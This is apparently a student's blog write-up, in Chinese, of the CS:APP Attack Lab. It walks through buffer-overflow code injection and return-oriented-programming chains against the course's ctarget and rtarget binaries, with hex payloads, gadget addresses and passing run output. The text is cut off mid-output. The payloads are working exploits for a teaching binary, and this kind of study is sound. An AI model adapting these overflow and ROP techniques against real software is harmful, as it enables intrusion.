@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunglassmanalex.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CS:APP Attack Lab 实验报告 Cookie ID: 0x59b997fa Target: Linux x86-64  Part I: Code Injection Attacks (ctarget) 在这一部分中，攻击手段主要是利用缓冲区溢出漏洞，将 shellcode 注入栈中并覆盖返回地址。 Level 1: Control Hijacking 目标：重定向程序流，使其在 ge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS:APP AttackLab实验报告">
+<meta property="og:url" content="https://sunglassmanalex.github.io/2025/11/26/CS-APP-AttackLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:site_name" content="Sunglassman&#39;s Blog">
+<meta property="og:description" content="CS:APP Attack Lab 实验报告 Cookie ID: 0x59b997fa Target: Linux x86-64  Part I: Code Injection Attacks (ctarget) 在这一部分中，攻击手段主要是利用缓冲区溢出漏洞，将 shellcode 注入栈中并覆盖返回地址。 Level 1: Control Hijacking 目标：重定向程序流，使其在 ge">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-26T06:09:14.000Z">
+<meta property="article:modified_time" content="2025-11-26T06:21:53.561Z">
+<meta property="article:author" content="Sunglassman">
+<meta property="article:tag" content="实验报告">
+<meta property="article:tag" content="计算机">
+<meta property="article:tag" content="计算机系统基础">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://sunglassmanalex.github.io/2025/11/26/CS-APP-AttackLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunglassmanalex.github.io/2025/11/26/CS-APP-AttackLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/","path":"2025/11/26/CS-APP-AttackLab实验报告/","title":"CS:APP AttackLab实验报告"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CS:APP AttackLab实验报告 | Sunglassman's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Sunglassman's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">CS:APP Attack Lab 实验报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-I-Code-Injection-Attacks-ctarget"><span class="nav-number">1.1.</span> <span class="nav-text">Part I: Code Injection Attacks (ctarget)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-1-Control-Hijacking"><span class="nav-number">1.1.1.</span> <span class="nav-text">Level 1: Control Hijacking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-2-Injecting-Code"><span class="nav-number">1.1.2.</span> <span class="nav-text">Level 2: Injecting Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3-String-Attack"><span class="nav-number">1.1.3.</span> <span class="nav-text">Level 3: String Attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-II-Return-Oriented-Programming-rtarget"><span class="nav-number">1.2.</span> <span class="nav-text">Part II: Return-Oriented Programming (rtarget)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-2-ROP-for-Touch2"><span class="nav-number">1.2.1.</span> <span class="nav-text">Level 2: ROP for Touch2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3-ROP-for-Touch3"><span class="nav-number">1.2.2.</span> <span class="nav-text">Level 3: ROP for Touch3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">实验总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Sunglassman</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunglassmanalex.github.io/2025/11/26/CS-APP-AttackLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sunglassman">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sunglassman's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CS:APP AttackLab实验报告 | Sunglassman's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CS:APP AttackLab实验报告
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-11-26 14:09:14 / 修改时间：14:21:53" itemprop="dateCreated datePublished" datetime="2025-11-26T14:09:14+08:00">2025-11-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">计算机</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">计算机系统基础</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" itemprop="url" rel="index"><span itemprop="name">实验报告</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" integrity="sha384-nB0miv6/jRmo5UMMR1wu3Gz6NLsoTkbqJghGIsx//Rlm+ZU03BU6SQNC66uf4l5+" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm/Yr2r3Dy4lfFg" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb/GhzOouOXtZMP/7XUzwPTstBeZFe/+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "$", right: "$", display: false},
+            {left: "\\(", right: "\\)", display: false},
+            {left: "\\begin{equation}", right: "\\end{equation}", display: true},
+            {left: "\\begin{align}", right: "\\end{align}", display: true},
+            {left: "\\begin{alignat}", right: "\\end{alignat}", display: true},
+            {left: "\\begin{gather}", right: "\\end{gather}", display: true},
+            {left: "\\begin{CD}", right: "\\end{CD}", display: true},
+            {left: "\\[", right: "\\]", display: true}
+          ],
+          throwOnError : false
+        });
+    });
+</script>
+<h1>CS:APP Attack Lab 实验报告</h1>
+<p>Cookie ID: 0x59b997fa</p>
+<p>Target: Linux x86-64</p>
+<hr>
+<h2 id="Part-I-Code-Injection-Attacks-ctarget">Part I: Code Injection Attacks (ctarget)</h2>
+<p>在这一部分中，攻击手段主要是利用缓冲区溢出漏洞，将 shellcode 注入栈中并覆盖返回地址。</p>
+<h3 id="Level-1-Control-Hijacking">Level 1: Control Hijacking</h3>
+<p><strong>目标</strong>：重定向程序流，使其在 <code>getbuf</code> 返回时执行 <code>touch1</code> 函数。</p>
+<p><strong>思路解析</strong>：</p>
+<ol>
+<li>
+<p><strong>确定缓冲区大小</strong>：反汇编 <code>getbuf</code> 函数，发现 <code>sub $0x28, %rsp</code>，说明缓冲区大小为 40 字节。</p>
+</li>
+<li>
+<p><strong>确定目标地址</strong>：反汇编 <code>touch1</code> 函数，找到其入口地址为 <code>0x4017c0</code>。</p>
+</li>
+<li>
+<p><strong>构造 Payload</strong>：</p>
+<p>使用 40 个字节的任意数据（如 <code>00</code>）填满缓冲区。</p>
+<p>紧接其后填入 <code>touch1</code> 的地址（8字节，小端序），覆盖原本的返回地址。</p>
+</li>
+</ol>
+<p><strong>构造的字符串</strong>：</p>
+<p>Plaintext</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">C0 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
+<p><strong>运行结果截图</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ICS/attacklab/target1 via C v13.3.0-gcc took 16m59s</span><br><span class="line">❯ ./hex2raw &lt; c-level1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Level-2-Injecting-Code">Level 2: Injecting Code</h3>
+<p><strong>目标</strong>：注入代码，将 Cookie (<code>0x59b997fa</code>) 作为参数传递给 <code>touch2</code> 并执行。</p>
+<p><strong>思路解析</strong>：</p>
+<ol>
+<li>
+<p><strong>参数传递</strong>：x86-64 架构中，第一个参数存放在 <code>%rdi</code> 寄存器。</p>
+</li>
+<li>
+<p><strong>注入代码编写</strong>：我们需要构造汇编指令 <code>movq $0x59b997fa, %rdi</code>。</p>
+</li>
+<li>
+<p><strong>跳转处理 (Push-Ret 技巧)</strong>：</p>
+<p>为了解决 Ubuntu 24.04+ 系统中 <code>glibc</code> 对栈 16 字节对齐的严格检查（防止 Segfault），我使用了 <code>push $addr; ret</code> 的方式跳转到 <code>touch2</code>，而不是直接 <code>call</code> 或 <code>jmp</code>。</p>
+<p>汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>栈地址定位</strong>：通过 GDB 调试发现缓冲区起始地址为 <code>0x5561dc78</code>。</p>
+</li>
+<li>
+<p><strong>Payload 结构</strong>：[注入代码] + [填充] + [覆盖返回地址指向缓冲区]。</p>
+</li>
+</ol>
+<p><strong>构造的字符串</strong>：</p>
+<p>Plaintext</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p><strong>运行结果截图</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ICS/attacklab/target1 via C v13.3.0-gcc</span><br><span class="line">❯ ./hex2raw &lt; c-level2.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Level-3-String-Attack">Level 3: String Attack</h3>
+<p><strong>目标</strong>：注入代码，传递 Cookie 的字符串表示（<code>&quot;59b997fa&quot;</code>）的地址给 <code>touch3</code>。</p>
+<p><strong>思路解析</strong>：</p>
+<ol>
+<li>
+<p><strong>字符串存储</strong>：将字符串数据放在 Payload 的最末尾，紧跟在返回地址之后，以防止被覆盖。</p>
+</li>
+<li>
+<p><strong>地址计算</strong>：</p>
+<p>栈起点：<code>0x5561dc78</code></p>
+<p>偏移量：40字节(Buffer) + 8字节(Ret Addr) = 48字节 (<code>0x30</code>)。</p>
+<p>字符串地址 = <code>0x5561dc78 + 0x30 = 0x5561dca8</code>。</p>
+</li>
+<li>
+<p><strong>注入代码编写</strong>：</p>
+<p>将计算出的字符串地址传给 <code>%rdi</code>。</p>
+<p>同样使用 <code>push $touch3; ret</code> 技巧来维持栈对齐。</p>
+</li>
+<li>
+<p><strong>Payload 结构</strong>：[注入代码] + [填充] + [覆盖返回地址指向缓冲区] + [字符串数据]。</p>
+</li>
+</ol>
+<p><strong>构造的字符串</strong>：</p>
+<p>Plaintext</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<p><strong>运行结果截图</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ICS/attacklab/target1 via C v13.3.0-gcc</span><br><span class="line">❯ ./hex2raw &lt; c-level3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Part-II-Return-Oriented-Programming-rtarget">Part II: Return-Oriented Programming (rtarget)</h2>
+<p>在这一部分，目标程序 <code>rtarget</code> 开启了随机化和 NX 保护。我们无法在栈上执行代码，只能利用程序现有的代码片段（Gadgets）进行攻击。</p>
+<h3 id="Level-2-ROP-for-Touch2">Level 2: ROP for Touch2</h3>
+<p><strong>目标</strong>：利用 Gadget 链将 Cookie 放入 <code>%rdi</code> 并跳转到 <code>touch2</code>。</p>
+<p><strong>思路解析</strong>：</p>
+<ol>
+<li>
+<p><strong>寻找 Gadget</strong>：我们需要一个能从栈上弹出数据到 <code>%rdi</code> 的指令。</p>
+<p>找到了 <code>pop %rdi; ret</code> (位于 <code>0x4019ab</code>)。</p>
+</li>
+<li>
+<p><strong>构造链条</strong>：</p>
+<p>Padding (40字节)</p>
+<p>Gadget 1 地址 (<code>pop %rdi</code>)</p>
+<p>Cookie 数据 (<code>0x59b997fa</code>) —— <code>pop</code> 指令会把它取出来放进 <code>%rdi</code>。</p>
+<p>目标函数地址 (<code>touch2</code> = <code>0x4017ec</code>)。</p>
+</li>
+</ol>
+<p><strong>构造的字符串</strong>：</p>
+<p>Plaintext</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p><strong>运行结果截图</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ICS/attacklab/target1 via C v13.3.0-gcc</span><br><span class="line">❯ ./hex2raw &lt; r-level2.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Level-3-ROP-for-Touch3">Level 3: ROP for Touch3</h3>
+<p><strong>目标</strong>：利用 ROP 链传递字符串地址给 <code>touch3</code>。</p>
+<p><strong>思路解析</strong>：</p>
+<ol>
+<li>
+<p><strong>难点</strong>：由于栈随机化，我们不知道字符串的确切地址。但字符串就在栈上（Payload 末尾），其地址等于 <code>%rsp</code> 加上某个偏移量。</p>
+</li>
+<li>
+<p><strong>核心逻辑</strong>：我们需要计算 <code>%rsp + offset</code> 并放入 <code>%rdi</code>。</p>
+</li>
+<li>
+<p><strong>Gadget 链设计</strong>：</p>
+<p><code>mov %rsp, %rax; ret</code> (<code>0x401aad</code>): 获取当前栈指针。</p>
+<p><code>mov %rax, %rdi; ret</code> (<code>0x4019a2</code>): 转移到 <code>%rdi</code>。</p>
+<p><code>pop %rax; ret</code> (<code>0x4019cc</code>): 从栈上加载偏移量到 <code>%rax</code>。</p>
+<p><code>mov %eax, %edx; ret</code> (<code>0x4019dd</code>): 转移偏移量到 <code>%rdx</code> (准备加法)。</p>
+<p><code>add %rdx, %rdi; ret</code> (<code>0x401a70</code>): <code>%rdi = %rdi + %rdx</code> (计算出字符串绝对地址)。</p>
+<p><code>mov %rdi, %rax; ret</code> (<code>0x401a13</code>): 整理数据（根据 farm 结构可能需要，或作为 nop 链）。</p>
+<p><code>touch3</code> 地址 (<code>0x4018fa</code>)。</p>
+<p>字符串数据 (<code>&quot;59b997fa&quot;</code>).</p>
+</li>
+</ol>
+<p><strong>构造的字符串</strong>：</p>
+<p>Plaintext</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ad 1a 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 </span><br><span class="line">48 00 00 00 00 00 00 00 </span><br><span class="line">dd 19 40 00 00 00 00 00 </span><br><span class="line">70 1a 40 00 00 00 00 00 </span><br><span class="line">13 1a 40 00 00 00 00 00 </span><br><span class="line">d6 19 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<p><strong>运行结果截图</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ICS/attacklab/target1 via C v13.3.0-gcc</span><br><span class="line">❯ ./hex2raw &lt; r-level3.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 